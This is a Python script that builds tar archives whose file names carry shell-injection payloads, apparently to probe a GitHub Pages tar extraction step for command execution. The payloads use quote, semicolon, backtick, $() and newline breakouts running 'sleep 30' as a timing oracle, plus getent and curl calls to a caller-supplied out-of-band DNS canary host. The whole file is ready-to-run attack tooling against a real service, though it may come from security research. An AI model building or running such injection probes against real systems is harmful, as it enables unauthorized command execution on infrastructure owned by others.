#!/usr/bin/env python3
"""
Deep shell-injection probe generator for GitHub Pages tar extractor.

Timing oracle (T1-T6, A1) + DNS-OOB attribution (D1-D3) + control (C1).
Emits one uncompressed artifact.tar per case into ./tarballs/<CASE>.tar
Each tar's INTERNAL name is exactly "artifact.tar".
Structure: [member#1 = injection name with case-specific typeflag, 0 bytes]
           [member#2 = index.html body "deep-ok"]

Usage: python3 make_deep_probes.py CANARY_DNS_BASE
       CANARY_DNS_BASE   e.g. abc123.oast.fun
"""
import io, json, os, secrets, sys, tarfile, time

INDEX_HTML = b"deep-ok"

def build_cases(dns):
    """Returns list of (case_name, typeflag_str, member_name_str)."""
    cases = []
    # TIMING ORACLE
    cases.append(("T1_Q_SLEEP",     "REG", "x';sleep 30;#"))
    cases.append(("T2_SEMI_SLEEP",  "REG", "x;sleep 30"))
    cases.append(("T3_BACK_SLEEP",  "REG", "x`sleep 30`"))
    cases.append(("T4_SUBST_SLEEP", "REG", "x$(sleep 30)"))
    cases.append(("T5_PIPE_SLEEP",  "REG", "x'|sleep 30"))
    cases.append(("T6_NL_SLEEP",    "REG", "x\nsleep 30"))
    # DNS-OOB
    cases.append(("D1_Q_DNS",       "REG", f"x';getent hosts q1.{dns};#"))
    cases.append(("D2_SUBST_DNS",   "REG", f"x$(getent hosts q2.{dns})"))
    cases.append(("D3_CURL_DNS",    "REG", f"x';curl http://q3.{dns}/;#"))
    # ASYMMETRY twin
    cases.append(("A1_DIR_Q_SLEEP", "DIR", "x';sleep 30;#"))
    # CONTROL
    cases.append(("C1_CTRL",        "REG", f"ctrl-deep-{secrets.token_hex(4)}"))
    return cases

def make_tar(out_path, first_kind, first_name):
    nbytes = first_name.encode("utf-8", "surrogateescape")
    assert len(nbytes) < 100, f"name too long ({len(nbytes)}): {first_name!r}"
    with tarfile.open(out_path, "w", format=tarfile.USTAR_FORMAT) as tf:
        ti = tarfile.TarInfo(name=first_name)
        if first_kind == "DIR":
            ti.type = tarfile.DIRTYPE
            ti.mode = 0o755
        else:
            ti.type = tarfile.REGTYPE
            ti.mode = 0o644
        ti.size = 0
        ti.mtime = 0
        ti.uid = 0; ti.gid = 0; ti.uname = ""; ti.gname = ""
        tf.addfile(ti, io.BytesIO(b""))
        # member #2: benign index.html
        idx = tarfile.TarInfo(name="index.html")
        idx.type = tarfile.REGTYPE
        idx.mode = 0o644
        idx.size = len(INDEX_HTML)
        idx.mtime = 0
        tf.addfile(idx, io.BytesIO(INDEX_HTML))

def main():
    if len(sys.argv) != 2:
        print("usage: make_deep_probes.py CANARY_DNS_BASE", file=sys.stderr); sys.exit(2)
    dns = sys.argv[1].strip()
    here = os.path.dirname(os.path.abspath(__file__))
    out = os.path.join(here, "tarballs"); os.makedirs(out, exist_ok=True)
    cases = build_cases(dns)
    manifest = {}
    print(f"{'CASE':<18} {'KIND':<4} NAME(cat -v)")
    for case, kind, name in cases:
        fp = os.path.join(out, f"{case}.tar")
        make_tar(fp, kind, name)
        visible = "".join((c if 0x20 <= ord(c) < 0x7f else f"\\x{ord(c):02x}") for c in name)
        print(f"{case:<18} {kind:<4} {visible}")
        manifest[case] = {"kind": kind, "name": name, "file": f"{case}.tar"}
    with open(os.path.join(here, "manifest.json"), "w") as f:
        json.dump({"generated_at": int(time.time()), "canary_dns": dns, "cases": manifest}, f, indent=2)
    print(f"Wrote {len(cases)} tars into {out}")

if __name__ == "__main__":
    main()
